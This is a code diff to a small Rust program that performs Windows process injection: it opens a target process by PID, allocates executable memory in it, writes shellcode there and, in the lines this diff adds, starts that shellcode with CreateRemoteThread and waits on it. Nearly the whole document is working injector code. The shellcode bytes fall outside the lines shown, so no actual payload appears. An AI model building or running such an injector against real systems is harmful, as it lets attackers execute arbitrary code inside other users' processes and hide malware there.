@@ -1,27 +1,29 @@
 use std::{os::raw::{c_uint, c_void}, ptr::null_mut};
 
-#[link(name="kernel32")]
-
 type Handle = *mut c_void;
 type Win32Error = u32;
+
 const PROCESS_ALL_ACCESS: u32 = 0xF01FF;
 const MEM_COMMIT: u32 = 0x00001000;
 const MEM_RESERVE: u32 = 0x00002000;
 const PAGE_EXECUTE_READWRITE: u32 = 0x40;
+const INFINITE: u32 = 0xFFFFFFFF;
 
+#[link(name="kernel32")]
 extern {
     fn GetLastError() -> Win32Error;
     fn OpenProcess(dwDesiredAccess: u32, bUnheritHandle: bool, dwProcessId: u32) -> Handle;
     fn VirtualAllocEx(hProcess: Handle, lpAddress: *mut c_void, dwSize: usize, flAllocationType: u32, flProtect: u32) -> *mut c_void;
     fn WriteProcessMemory(hProcess: Handle, lpBaseAddress: *mut c_void, lpBuffer: *const c_void, nSize: usize, lpNumberOfBytesWritten: *mut c_uint) -> bool;
-
+    fn CreateRemoteThread(hProcess: Handle, lpThreadAttributes: *mut c_void, dwStackSize: usize, lpStartAddress: *const c_void, lpParameter: *mut c_void, dwCreationFlags: u32, lpThreadId: *mut c_uint) -> Handle;
+    fn WaitForSingleObject(handler: Handle, dwMilliseconds: u32) -> u32;
 }
 
 fn open_process(dw_desired_access: u32, b_unherit_handle: bool, dw_process_id: u32) -> Result<Handle, Win32Error>{
 
     let h_process = unsafe { OpenProcess(dw_desired_access, b_unherit_handle, dw_process_id) };
 
-    if h_process == null_mut(){
+    if h_process.is_null(){
         Err( unsafe { GetLastError() })
     }else{
         Ok(h_process)
@@ -30,11 +32,11 @@ fn open_process(dw_desired_access: u32, b_unherit_handle: bool, dw_process_id: u
 
 fn virtual_alloc_ex(h_process: Handle, lp_address: *mut c_void, dw_size: usize, fl_allocation_type: u32, fl_protect: u32) -> Result<*mut c_void, Win32Error>{
     let r_buffer = unsafe { VirtualAllocEx(
-        h_process,
-        lp_address,
-         dw_size,
-          fl_allocation_type,
-           fl_protect)
+    h_process,
+   lp_address,
+      dw_size,
+              fl_allocation_type,
+   fl_protect)
     };
 
     if r_buffer == null_mut(){
@@ -55,24 +57,41 @@ fn write_process_memory(h_process: Handle, lp_base_address: *mut c_void, lp_buff
     }
 }
 
+fn create_remote_thread(h_process: Handle, lp_thread_attributes: *mut c_void, dw_stack_size: usize, lp_start_address: *const c_void, lp_parameter: *mut c_void, dw_creation_flags: u32, lp_thread_id: *mut c_uint) -> Result<Handle, Win32Error> {
+    let h_thread = unsafe { CreateRemoteThread(
+        h_process,
+        lp_thread_attributes,
+        dw_stack_size,
+        lp_start_address,
+        lp_parameter,
+        dw_creation_flags,
+        lp_thread_id) };
+
+    if h_thread.is_null(){
+        Err(unsafe { GetLastError() } )
+    }else{
+        Ok(h_thread)
+    }
+}
+
 fn main() {
     let args = std::env::args().collect::<Vec<_>>();
     
     if args.len() < 2 {
-        eprintln!("Usage: {} <PID>", args[0]);
+        eprintln!("Usage: {} <pid>", args[0]);
         std::process::exit(1);
     }
-    let PID = args[1].parse::<u32>().unwrap_or_else(|_| {
-        eprintln!("Provided PID is invalid!");
+    let pid = args[1].parse::<u32>().unwrap_or_else(|_| {
+        eprintln!("Provided pid is invalid!");
         std::process::exit(1);
     });
 
-    let h_process = open_process(PROCESS_ALL_ACCESS, false, PID).unwrap_or_else(|c| {
+    let h_process = open_process(PROCESS_ALL_ACCESS, false, pid).unwrap_or_else(|c| {
         eprintln!("Error: {:?}", c);
         std::process::exit(2);
     });
 
-    println!("Process {} was opened {:?}", PID, h_process);
+    println!("Process {} was opened {:?}", pid, h_process);
 
     let r_buffer = virtual_alloc_ex(
         h_process,
@@ -98,6 +117,22 @@ fn main() {
         });
 
     println!("The shellcode was injected");
+
+    let h_thread = create_remote_thread(
+        h_process,
+        null_mut(),
+        0,
+        r_buffer, null_mut(),
+        0,
+        null_mut()).unwrap_or_else(|c| {
+            eprintln!("Error: {:?}", c);
+            std::process::exit(5);
+        });
+
+    println!("The shellcode started executing. Thread handler: {:?}", h_thread);
+    println!("The waiting for remote thread is started");
+
+    unsafe{ WaitForSingleObject(h_thread, INFINITE) };
 
 }
 
